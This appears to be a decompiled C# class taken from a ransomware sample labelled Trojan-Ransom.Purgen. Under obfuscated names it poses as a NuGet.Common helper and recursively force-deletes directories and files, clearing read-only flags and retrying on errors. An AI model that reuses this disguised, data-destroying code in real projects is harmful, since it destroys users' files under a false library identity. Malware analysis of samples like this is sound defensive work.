// Decompiled with JetBrains decompiler
// Type: NuGet.Common.EppYKshJcE
// Assembly: Ty6CWyxFEL, Version=5.0.0.2, Culture=neutral, PublicKeyToken=31bf3856ad364e35
// MVID: 271E2DAF-741A-443A-8BCF-B62C509DDC38
// Assembly location: C:\Users\Administrateur\Downloads\toto\HEUR-Trojan-Ransom.MSIL.Purgen.gen-185fafbeb00cd8238fdabee088763e27012dd3a0076e04dddca6266f129f0430.exe

using System;
using System.Collections.Generic;
using System.IO;
using System.Threading;

namespace NuGet.Common
{
  public class EppYKshJcE
  {
    public static void NaKEQmuAn2(string _param0, List<string> IEqyItK5Se)
    {
      if (!Directory.Exists(_param0))
        return;
      bool flag = false;
      try
      {
        Directory.Delete(_param0, true);
      }
      catch (DirectoryNotFoundException ex)
      {
      }
      catch (IOException ex)
      {
        flag = true;
      }
      catch (UnauthorizedAccessException ex)
      {
        flag = true;
      }
      if (!flag)
        return;
      EppYKshJcE.uTcXMYC0Dq(_param0, IEqyItK5Se);
      try
      {
        EppYKshJcE.LQb6gfj3Bm(_param0);
      }
      catch (DirectoryNotFoundException ex)
      {
      }
      catch (PathTooLongException ex)
      {
        IEqyItK5Se.Add(_param0);
      }
      catch (UnauthorizedAccessException ex)
      {
        IEqyItK5Se.Add(_param0);
      }
    }

    private static void LQb6gfj3Bm(string nNSDfyEgRu)
    {
      try
      {
        Directory.Delete(nNSDfyEgRu, true);
      }
      catch (DirectoryNotFoundException ex)
      {
      }
      catch (IOException ex)
      {
        Thread.Sleep(500);
        Directory.Delete(nNSDfyEgRu, true);
      }
    }

    private static void uTcXMYC0Dq(string nW4pe5pHGI, List<string> WbgTobbXiE)
    {
      foreach (string enumerateDirectory in Directory.EnumerateDirectories(nW4pe5pHGI))
      {
        if (!new DirectoryInfo(enumerateDirectory).Attributes.HasFlag((Enum) FileAttributes.ReparsePoint))
          EppYKshJcE.uTcXMYC0Dq(enumerateDirectory, WbgTobbXiE);
      }
      foreach (string enumerateFile in Directory.EnumerateFiles(nW4pe5pHGI))
      {
        string path = Path.Combine(nW4pe5pHGI, Path.GetFileName(enumerateFile));
        try
        {
          FileAttributes attributes = File.GetAttributes(path);
          if (attributes.HasFlag((Enum) FileAttributes.ReadOnly))
          {
            FileAttributes fileAttributes = attributes & ~FileAttributes.ReadOnly;
            File.SetAttributes(path, fileAttributes);
          }
          File.Delete(path);
        }
        catch (PathTooLongException ex)
        {
          WbgTobbXiE.Add(path);
        }
        catch (UnauthorizedAccessException ex)
        {
          WbgTobbXiE.Add(path);
        }
        catch (IOException ex)
        {
          WbgTobbXiE.Add(path);
        }
      }
    }
  }
}
